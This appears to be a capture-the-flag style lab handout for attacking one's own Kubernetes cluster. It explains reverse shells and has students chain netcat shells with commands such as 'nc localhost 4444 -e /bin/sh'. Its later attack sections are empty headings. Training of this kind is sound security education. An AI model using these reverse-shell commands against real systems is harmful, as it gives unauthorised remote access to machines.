# Session 3

The goal of this session is to attack your Kubernetes cluster, and reach the backend service.

## Understanding the netcat tool:

First, you will work with the netcat tool in local. In your terminal, try the command:
```bash
nc -lvp 4444
```

If `nc` is not recognized, try installing `netcat-openbsd` using command:
```bash
sudo apt install netcat-openbsd
```
The netcat tool will be used to attack the cluster. Using netcat commands, a reverse shell can be created. A reverse shell gives access to the attacked machine the following way:

- Attacker listens to a netcat connection on their machine using `nc -lvp <port_number>`.
- Attacker uses a vulnerability of target machine to have it use a netcat command to start a connection.
- Target starts a connection to attacker's machine, and also launches a shell: Attacker now has access to target machine, and every data sent by attacker is parsed as if it is a shell command on target machine.

This method's goal is to bypass firewalls by having the server itself start the connection, and hoping the firewall will only check for unwanted connections from outside. The commands that can be used to create reverse shells using netcat are listed on many cheatsheets on internet. Among them is [this](https://gabb4r.gitbook.io/oscp-notes/shell/bind-and-reverse-shell) cheatsheet.  

In the previous cheatsheet, read the "Bind and Reverse shell" part, and then the "Upgrading your shell" part. The first one explains how to get a reverse shell, and the second explains how to have a responsive shell. 

First, try to have a reverse shell between two terminals. Then try to chain them between three terminals: 

- In a first terminal, use the command `nc -lvp 4444`
- In a second terminal, use the command `nc localhost 4444 -e /bin/sh`
- Upgrade your shell in the first terminal
- In the first terminal, use the command `nc -lvp 4445`
- In a third terminal, use the command `nc localhost 4445 -e /bin/sh`
- Upgrade the shell again

You should now have a shell going to the third terminal from the first, through the second terminal. Chaining the shells will be needed, as because of network rules, only frontend and backend can reach middle-end server.

## Attacking the frontend server

## Attacking the middle-end server

## Getting the flag

## To go further